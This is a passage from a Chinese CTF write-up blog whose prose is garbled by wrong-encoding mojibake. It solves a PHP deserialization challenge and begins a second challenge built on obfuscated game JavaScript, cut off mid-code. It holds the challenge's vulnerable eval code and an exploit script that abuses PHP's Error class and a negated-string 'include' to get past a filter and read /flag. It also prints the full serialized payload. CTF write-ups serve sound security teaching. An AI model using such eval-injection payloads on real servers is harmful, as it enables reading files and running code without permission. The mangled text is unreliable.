äº†ä¸€ä¸ªæŸ¥çœ‹phpinfoçš„phpä»£ç ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„payloadå‰é¢è¿˜æœ‰<code>?&gt;</code> å­—ç¬¦ä¸²æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦åˆ©ç”¨?&gt;æ¥å°†å‰é¢çš„&lt;?phpé—­åˆï¼Œ <code>Exception</code> ç±»ä¸ <code>Error</code> çš„ <code>__toString</code> æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„ï¼Œå³è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µæ‚ä¹±ä¿¡æ¯â€œError: â€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: payload in /var/www/html/tmp/index.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥<code>eval()</code>å‡½æ•°ä¼šç±»ä¼¼äºï¼š<code>eval(&quot;...Error: &lt;?=include &#39;/flag&#39;?&gt;&quot;)</code> ï¼Œæ‰€ä»¥éœ€è¦ç”¨?&gt;é—­åˆä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>&lt;?php ...... eval(&quot;...Error: ?&gt;&lt;?=include &#39;/flag&#39;?&gt;&quot;)</code> ï¼Œè¿™æ ·æˆ‘ä»¬çš„å‘½ä»¤å°±å¯ä»¥æˆåŠŸæ‰§è¡Œäº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png"></a></p><p>æˆåŠŸæŸ¥çœ‹phpinfoã€‚</p><p>Expetionç±»ä¹Ÿä¸Errorçš„ä½¿ç”¨å’Œç»“æœå®Œå…¨ä¸€æ ·ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»å°è¯•ä»¥ä¸‹ã€‚</p><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><p>å› ä¸ºExpetionç±»çš„ä½¿ç”¨ç‰ˆæœ¬æ˜¯php5å’Œphp7ï¼ŒErrorç±»çš„ä½¿ç”¨ç‰ˆæœ¬æ˜¯php7ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŸ¥çœ‹ç›¸åº”çš„é¢˜ç›®ç¯å¢ƒæ¥åˆ¤æ–­åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªã€‚åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œphpç‰ˆæœ¬æ˜¯7.2.34ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨Errorç±»ã€‚</p><p>æ¥ç€æˆ‘ä»¬å®¡è®¡ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">           <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹aå˜é‡ä¸bå˜é‡è¿›è¡Œäº†åˆ¤æ–­ï¼Œè¿™äº›åˆ¤æ–­ç›´æ¥ç”¨Errorç±»å³å¯ç»•è¿‡ï¼Œæ¥ç€çœ‹ä¸‹é¢çš„è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">           <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œè¿‡æ»¤äº†æ‹¬å·ä½¿å¾—æˆ‘ä»¬æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>include &#39;/flag&#39;</code> æ¥è·å–flagã€‚è¿˜è¿‡æ»¤äº†å•å¼•å·åŒå¼•å·ï¼Œç›´æ¥å–åç»•è¿‡å³å¯ã€‚è¿˜è¿‡æ»¤äº†<code>?&lt;php</code> è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>&lt;?=</code>çŸ­æ ‡ç­¾ç»•è¿‡ã€‚ç»™å‡ºEXPï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$p</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$q</span> = <span class="keyword">new</span> <span class="title class_">Snert</span>();</span><br><span class="line"><span class="variable">$q</span>-&gt;a = <span class="variable">$o</span>;</span><br><span class="line"><span class="variable">$q</span>-&gt;b = <span class="variable">$p</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$q</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒEXPï¼Œå¾—åˆ°payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?snert_is_good=O%3A5%3A%22Snert%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Ctest1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A11%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A1%3A%22b%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Ctest1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A11%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="åˆ«è¸©ç™½å—å„¿"><a href="#åˆ«è¸©ç™½å—å„¿" class="headerlink" title="åˆ«è¸©ç™½å—å„¿"></a>åˆ«è¸©ç™½å—å„¿</h2><p>æ‰“å¼€ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªåˆ«è¸©ç™½å—å„¿çš„æ¸¸æˆç•Œé¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png"></a></p><p>ç©äº†å¾ˆä¹…éƒ½ä¸Šä¸äº†50åˆ†ï¼Œé‚£ä¹ˆå¯æƒ³è€ŒçŸ¥è¿™ä¸ªé¢˜ç›®ä¸ä¼šé€šè¿‡ç©æ¸¸æˆæ‹¿åˆ°flagï¼ˆä¸å¯èƒ½æ˜¯æˆ‘èœï¼Œé€ƒï¼‰ã€‚</p><p>æŸ¥çœ‹ç½‘ç«™æºç ï¼Œå‘ç°ä¸€ä¸ªå¯ç–‘çš„jsæ–‡ä»¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xodh=<span class="string">&#x27;jsjiami.com.v6&#x27;</span>,_0xodh_=[<span class="string">&#x27;_0xodh&#x27;</span>],_0x5438=[_0xodh,<span class="string">&#x27;a2NsSVo=&#x27;</span>,<span class="string">&#x27;Q1BnanM=&#x27;</span>,<span class="string">&#x27;LTEwMXB4&#x27;</span>,<span class="string">&#x27;5L2g6LaF56We5LqG77yB&#x27;</span>,<span class="string">&#x27;ZUxGako=&#x27;</span>,<span class="string">&#x27;cGFzcw==&#x27;</span>,<span class="string">&#x27;Smh0Skk=&#x27;</span>,<span class="string">&#x27;a1BuR3U=&#x27;</span>,<span class="string">&#x27;VFNYQ2E=&#x27;</span>,<span class="string">&#x27;eHRRZm0=&#x27;</span>,<span class="string">&#x27;c2NvcmU=&#x27;</span>,<span class="string">&#x27;ICAg5ZOI5ZOI77yM5bCx6L+Z5rC05bmz6L+Y5oOz5ou/ZmxhZ++8nw==&#x27;</span>,<span class="string">&#x27;LTQwOHB4&#x27;</span>,<span class="string">&#x27;aU9Kakk=&#x27;</span>,<span class="string">&#x27;dmZvcW4=&#x27;</span>,<span class="string">&#x27;TVFUcWc=&#x27;</span>,<span class="string">&#x27;aW5uZXJIVE1M&#x27;</span>,<span class="string">&#x27;T0pudm4=&#x27;</span>,<span class="string">&#x27;dHhkem4=&#x27;</span>,<span class="string">&#x27;WGRVUUs=&#x27;</span>,<span class="string">&#x27;RXlVR3o=&#x27;</span>,<span class="string">&#x27;c2JxWXU=&#x27;</span>,<span class="string">&#x27;T2NwUm4=&#x27;</span>,<span class="string">&#x27;eW5yVU4=&#x27;</span>,<span class="string">&#x27;WFVlYnI=&#x27;</span>,<span class="string">&#x27;5L2g55qE5pyA57uI5b6X5YiGIA==&#x27;</span>,<span class="string">&#x27;aGRjcU0=&#x27;</span>,<span class="string">&#x27;dFBUemU=&#x27;</span>,<span class="string">&#x27;YmxhY2s=&#x27;</span>,<span class="string">&#x27;dGFyZ2V0&#x27;</span>,<span class="string">&#x27;aW5kZXhPZg==&#x27;</span>,<span class="string">&#x27;Y2xhc3NOYW1l&#x27;</span>,<span class="string">&#x27;UGZzRVg=&#x27;</span>,<span class="string">&#x27;Ylhxb1g=&#x27;</span>,<span class="string">&#x27;eWhOeEY=&#x27;</span>,<span class="string">&#x27;bkR2Q2U=&#x27;</span>,<span class="string">&#x27;Mnw2fDd8MXwzfDV8MHw0&#x27;</span>,<span class="string">&#x27;c3BsaXQ=&#x27;</span>,<span class="string">&#x27;UU5wYlc=&#x27;</span>,<span class="string">&#x27;V2pMaGE=&#x27;</span>,<span class="string">&#x27;cmhBZ2Q=&#x27;</span>,<span class="string">&#x27;TFdUSm0=&#x27;</span>,<span class="string">&#x27;eUx5WUQ=&#x27;</span>,<span class="string">&#x27;dW1UUXo=&#x27;</span>,<span class="string">&#x27;QVJDTkE=&#x27;</span>,<span class="string">&#x27;RXpoTG8=&#x27;</span>,<span class="string">&#x27;Q1BsYks=&#x27;</span>,<span class="string">&#x27;bllwUW0=&#x27;</span>,<span class="string">&#x27;Zm51cXU=&#x27;</span>,<span class="string">&#x27;Z2V0RWxlbWVudEJ5SWQ=&#x27;</span>,<span class="string">&#x27;UExoU3M=&#x27;</span>,<span class="string">&#x27;ZWF0Xw==&#x27;</span>,<span class="string">&#x27;ZV9vbg==&#x27;</span>,<span class="string">&#x27;cmVfZ3I=&#x27;</span>,<span class="string">&#x27;eW91X2E=&#x27;</span>,<span class="string">&#x27;5ri45oiP5bey57uP5byA5aeL77yM5peg6ZyA5YaN5qyh54K55Ye777yB&#x27;</span>,<span class="string">&#x27;TFpjVUs=&#x27;</span>,<span class="string">&#x27;bGZJcks=&#x27;</span>,<span class="string">&#x27;VU96R3E=&#x27;</span>,<span class="string">&#x27;b1BYaFg=&#x27;</span>,<span class="string">&#x27;Q3RQckM=&#x27;</span>,<span class="string">&#x27;bWFpbg==&#x27;</span>,<span class="string">&#x27;V3NNd2s=&#x27;</span>,<span class="string">&#x27;a2poVGc=&#x27;</span>,<span class="string">&#x27;dVB4cGE=&#x27;</span>,<span class="string">&#x27;end1Rm8=&#x27;</span>,<span class="string">&#x27;Q3V0Zmc=&#x27;</span>,<span class="string">&#x27;SGdETFQ=&#x27;</span>,<span class="string">&#x27;VVFQUk0=&#x27;</span>,<span class="string">&#x27;bW92ZSgp&#x27;</span>,<span class="string">&#x27;cm93&#x27;</span>,<span class="string">&#x27;ZVdJUVo=&#x27;</span>,<span class="string">&#x27;b0RqWng=&#x27;</span>,<span class="string">&#x27;RWtGY20=&#x27;</span>,<span class="string">&#x27;UFpOcGI=&#x27;</span>,<span class="string">&#x27;YXBwZW5kQ2hpbGQ=&#x27;</span>,<span class="string">&#x27;bU1pclk=&#x27;</span>,<span class="string">&#x27;QlVuSXM=&#x27;</span>,<span class="string">&#x27;YmxJR2c=&#x27;</span>,<span class="string">&#x27;cExZY3M=&#x27;</span>,<span class="string">&#x27;cGFyZW50Tm9kZQ==&#x27;</span>,<span class="string">&#x27;V21IU2s=&#x27;</span>,<span class="string">&#x27;TGRCT2g=&#x27;</span>,<span class="string">&#x27;aW5zZXJ0QmVmb3Jl&#x27;</span>,<span class="string">&#x27;Zmlyc3RDaGlsZA==&#x27;</span>,<span class="string">&#x27;NHwwfDN8Mnwx&#x27;</span>,<span class="string">&#x27;b25jbGljaw==&#x27;</span>,<span class="string">&#x27;TU96UGo=&#x27;</span>,<span class="string">&#x27;blp6d0M=&#x27;</span>,<span class="string">&#x27;Y2hpbGROb2Rlcw==&#x27;</span>,<span class="string">&#x27;bGVuZ3Ro&#x27;</span>,<span class="string">&#x27;V2VJR2g=&#x27;</span>,<span class="string">&#x27;cmVtb3ZlQ2hpbGQ=&#x27;</span>,<span class="string">&#x27;bGFzdENoaWxk&#x27;</span>,<span class="string">&#x27;WEd6eWw=&#x27;</span>,<span class="string">&#x27;cGFzczE=&#x27;</span>,<span class="string">&#x27;VEJxbVQ=&#x27;</span>,<span class="string">&#x27;Y2VsbA==&#x27;</span>,<span class="string">&#x27;cHJrWXI=&#x27;</span>,<span class="string">&#x27;Zmxvb3I=&#x27;</span>,<span class="string">&#x27;cmFuZG9t&#x27;</span>,<span class="string">&#x27;Y2VsbCBibGFjaw==&#x27;</span>,<span class="string">&#x27;Y29u&#x27;</span>,<span class="string">&#x27;Z2V0Q29tcHV0ZWRTdHlsZQ==&#x27;</span>,<span class="string">&#x27;VGZOdmI=&#x27;</span>,<span class="string">&#x27;c3R5bGU=&#x27;</span>,<span class="string">&#x27;dG9w&#x27;</span>,<span class="string">&#x27;RXhydU4=&#x27;</span>,<span class="string">&#x27;WWVYU3k=&#x27;</span>,<span class="string">&#x27;jsjINiXamFi.czoRm.gWnQv6bptUUF==&#x27;</span>];<span class="keyword">if</span>(<span class="keyword">function</span>(<span class="params">_0x1b0a33,_0x36c283,_0x35fc1f</span>)&#123;<span class="keyword">function</span> <span class="title function_">_0x311d4f</span>(<span class="params">_0x5a9fdd,_0x2292a4,_0x5e7648,_0xcb1fab,_0x6675df,_0x49fb32</span>)&#123;_0x2292a4=_0x2292a4&gt;&gt;<span class="number">0x8</span>,_0x6675df=<span class="string">&#x27;po&#x27;</span>;<span class="keyword">var</span> _0x73c929=<span class="string">&#x27;shift&#x27;</span>,_0x42487a=<span class="string">&#x27;push&#x27;</span>,_0x49fb32=<span class="string">&#x27;0.7gmpnmz84d&#x27;</span>;<span class="keyword">if</span>(_0x2292a4&lt;_0x5a9fdd)&#123;<span class="keyword">while</span>(--_0x5a9fdd)&#123;_0xcb1fab=_0x1b0a33[_0x73c929]();<span class="keyword">if</span>(_0x2292a4===_0x5a9fdd&amp;&amp;_0x49fb32===<span class="string">&#x27;0.7gmpnmz84d&#x27;</span>&amp;&amp;_0x49fb32[<span class="string">&#x27;length&#x27;</span>]===<span class="number">0xc</span>)&#123;_0x2292a4=_0xcb1fab,_0x5e7648=_0x1b0a33[_0x6675df+<span class="string">&#x27;p&#x27;</span>]();&#125;<span class="keyword">else</span> <span class="keyword">if</span>(_0x2292a4&amp;&amp;_0x5e7648[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/[INXFzRgWnQbptUUF=]/g</span>,<span class="string">&#x27;&#x27;</span>)===_0x2292a4)&#123;_0x1b0a33[_0x42487a](_0xcb1fab);&#125;&#125;_0x1b0a33[_0x42487a](_0x1b0a33[_0x73c929]());&#125;<span class="keyword">return</span> <span class="number">0xe0d46</span>;&#125;;<span class="keyword">return</span> <span class="title function_">_0x311d4f</span>(++_0x36c283,_0x35fc1f)&gt;&gt;_0x36c283^_0x35fc1f;&#125;(_0x5438,<span class="number">0x1e5</span>,<span class="number">0x1e500</span>),_0x5438)&#123;_0xodh_=_0x5438[<span class="string">&#x27;length&#x27;</span>]^<span class="number">0x1e5</span>;&#125;;<span class="keyword">function</span> <span class="title function_">_0x1d2e</span>(<span class="params">_0x2ecb48,_0x3321f5</span>)&#123;_0x2ecb48=~~<span class="string">&#x27;0x&#x27;</span>[<span class="string">&#x27;concat&#x27;</span>](_0x2ecb48[<span class="string">&#x27;slice&#x27;</span>](<span class="number">0x0</span>));<span class="keyword">var</span> _0x28ed54=_0x5438[_0x2ecb48];<span class="keyword">if</span>(_0x1d2e[<span class="string">&#x27;kzcnsq&#x27;</span>]===<span class="literal">undefined</span>)&#123;(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x555d4e=<span class="keyword">typeof</span> <span class="variable language_">window</span>!==<span class="string">&#x27;undefined&#x27;</span>?<span class="attr">window</span>:<span class="keyword">typeof</span> process===<span class="string">&#x27;object&#x27;</span>&amp;&amp;<span class="keyword">typeof</span> <span class="built_in">require</span>===<span class="string">&#x27;function&#x27;</span>&amp;&amp;<span class="keyword">typeof</span> <span class="variable language_">global</span>===<span class="string">&#x27;object&#x27;</span>?<span class="attr">global</span>:<span class="variable language_">this</span>;<span class="keyword">var</span> _0x58cd15=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;_0x555d4e[<span class="string">&#x27;atob&#x27;</span>]||(_0x555d4e[<span class="string">&#x27;atob&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x4aea15</span>)&#123;<span class="keyword">var</span> _0x11308f=<span class="title class_">String</span>(_0x4aea15)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>,<span class="string">&#x27;&#x27;</span>);<span class="keyword">for</span>(<span class="keyword">var</span> _0x2431ae=<span class="number">0x0</span>,_0x400573,_0x4ebd7c,_0x46df95=<span class="number">0x0</span>,_0x291d35=<span class="string">&#x27;&#x27;</span>;_0x4ebd7c=_0x11308f[<span class="string">&#x27;charAt&#x27;</span>](_0x46df95++);~_0x4ebd7c&amp;&amp;(_0x400573=_0x2431ae%<span class="number">0x4</span>?_0x400573*<span class="number">0x40</span>+<span class="attr">_0x4ebd7c</span>:_0x4ebd7c,_0x2431ae++%<span class="number">0x4</span>)?_0x291d35+=<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span>&amp;_0x400573&gt;&gt;(-<span class="number">0x2</span>*_0x2431ae&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;_0x4ebd7c=_0x58cd15[<span class="string">&#x27;indexOf&#x27;</span>](_0x4ebd7c);&#125;<span class="keyword">return</span> _0x291d35;&#125;);&#125;());_0x1d2e[<span class="string">&#x27;wFtflA&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x252547</span>)&#123;<span class="keyword">var</span> _0x266165=<span class="title function_">atob</span>(_0x252547);<span class="keyword">var</span> _0x5ac6ea=[];<span class="keyword">for</span>(<span class="keyword">var</span> _0x50bcd0=<span class="number">0x0</span>,_0xcf4f7b=_0x266165[<span class="string">&#x27;length&#x27;</span>];_0x50bcd0&lt;_0xcf4f7b;_0x50bcd0++)&#123;_0x5ac6ea+=<span class="string">&#x27;%&#x27;</span>+(<span class="string">&#x27;00&#x27;</span>+_0x266165[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x50bcd0)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x5ac6ea);&#125;;_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>]=&#123;&#125;;_0x1d2e[<span class="string">&#x27;kzcnsq&#x27;</span>]=!![];&#125;<span class="keyword">var</span> _0x192bd6=_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>][_0x2ecb48];<span class="keyword">if</span>(_0x192bd6===<span class="literal">undefined</span>)&#123;_0x28ed54=_0x1d2e[<span class="string">&#x27;wFtflA&#x27;</span>](_0x28ed54);_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>][_0x2ecb48]=_0x28ed54;&#125;<span class="keyword">else</span>&#123;_0x28ed54=_0x192bd6;&#125;<span class="keyword">return</span> _0x28ed54;&#125;;<span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">_0x4c27d2</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;0&#x27;</span>)](_0x4c27d2);&#125;<span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">_0x1e165d</span>)&#123;<span class="keyword">var</span> _0x5a88c5=&#123;<span class="string">&#x27;PLhSs&#x27;</span>:<span class="string">&#x27;div&#x27;</span>&#125;;<span class="keyword">var</span> _0x138beb=<span class="variable language_">document</span>[<span class="string">&#x27;createElement&#x27;</span>](_0x5a88c5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1&#x27;</span>)]);_0x138beb[<span class="string">&#x27;className&#x27;</span>]=_0x1e165d;<span class="keyword">return</span> _0x138beb;&#125;<span class="keyword">var</span> clock=<span class="literal">null</span>;<span class="keyword">var</span> state=<span class="number">0x0</span>;<span class="keyword">var</span> speed=<span class="number">0x6</span>;<span class="keyword">var</span> result=![];<span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;!&#125;&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3&#x27;</span>),<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4&#x27;</span>),<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5&#x27;</span>),<span class="string">&#x27;sne&#x27;</span>];<span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x2a2153=&#123;<span class="string">&#x27;LZcUK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x36db61</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x36db61</span>();&#125;,<span class="string">&#x27;lfIrK&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6&#x27;</span>)&#125;;<span class="keyword">if</span>(!result)&#123;_0x2a2153[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;7&#x27;</span>)](init);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(_0x2a2153[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;8&#x27;</span>)]);&#125;&#125;<span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x595dcc=&#123;<span class="string">&#x27;WsMwk&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;9&#x27;</span>),<span class="string">&#x27;kjhTg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x401487,_0x55dd27</span>)&#123;<span class="keyword">return</span> _0x401487||_0x55dd27;&#125;,<span class="string">&#x27;uPxpa&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xe37034,_0x1f9e25</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xe37034</span>(_0x1f9e25);&#125;,<span class="string">&#x27;oPXhX&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2f18f4</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x2f18f4</span>();&#125;,<span class="string">&#x27;CtPrC&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xab3c78,_0x4ce2df</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xab3c78</span>(_0x4ce2df);&#125;,<span class="string">&#x27;zwuFo&#x27;</span>:<span class="string">&#x27;move()&#x27;</span>&#125;;result=!![];<span class="keyword">for</span>(<span class="keyword">var</span> _0x340b33=<span class="number">0x0</span>;_0x340b33&lt;<span class="number">0x4</span>;_0x340b33++)&#123;_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;a&#x27;</span>)](createrow);&#125;_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;b&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;c&#x27;</span>))[<span class="string">&#x27;onclick&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x5abac5</span>)&#123;<span class="keyword">if</span>(_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;d&#x27;</span>)]!==_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;d&#x27;</span>)])&#123;<span class="title function_">alert</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6&#x27;</span>));&#125;<span class="keyword">else</span>&#123;_0x5abac5=_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;e&#x27;</span>)](_0x5abac5,event);_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;f&#x27;</span>)](judge,_0x5abac5);&#125;&#125;;clock=<span class="variable language_">window</span>[<span class="string">&#x27;setInterval&#x27;</span>](_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;10&#x27;</span>)],<span class="number">0x1e</span>);&#125;<span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xc9cc6=&#123;<span class="string">&#x27;Cutfg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3de745,_0x54f7ec</span>)&#123;<span class="keyword">return</span> _0x3de745+_0x54f7ec;&#125;,<span 